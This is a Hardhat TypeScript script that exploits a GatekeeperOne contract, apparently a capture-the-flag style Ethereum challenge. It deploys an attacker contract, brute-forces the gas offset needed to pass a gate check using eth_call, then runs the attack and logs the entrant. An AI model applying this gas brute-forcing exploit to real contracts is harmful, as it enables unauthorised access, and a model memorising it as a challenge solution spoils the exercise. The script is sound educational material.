import {ethers} from "hardhat"
import dotenv from 'dotenv'
import {GatekeeperOne} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false
    let target: GatekeeperOne
    if (isLocalTest) {
        target = await ethers.deployContract('GatekeeperOne')
    } else {
        target = await ethers.getContractAt('GatekeeperOne', process.env.TARGET_ADDRESS_14!)
    }

    const attacker = await ethers.deployContract('AttackGatekeeperOne', [target.target])
    const [sender] = await ethers.getSigners()

    // try to get the gas base to pass gate two with eth_call
    let gasDesiredBase = 0
    for (let i = 0; i < 8191; i++) {
        const gas = 8191 * 3 + i
        const input = attacker.interface.encodeFunctionData('getGasDesiredBase', [gas])
        const res = await ethers.provider.call({
            from: sender.address,
            to: attacker.target,
            data: input
        })
        // desired gas if res is true
        if (res == '0x0000000000000000000000000000000000000000000000000000000000000001') {
            gasDesiredBase = gas
            break
        }
    }

    console.log(`desired gas base: ${gasDesiredBase}`)
    console.log(`entrant before attack: ${await target.entrant()}`)
    await attacker.attack(gasDesiredBase);
    console.log(`entrant after attack: ${await target.entrant()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
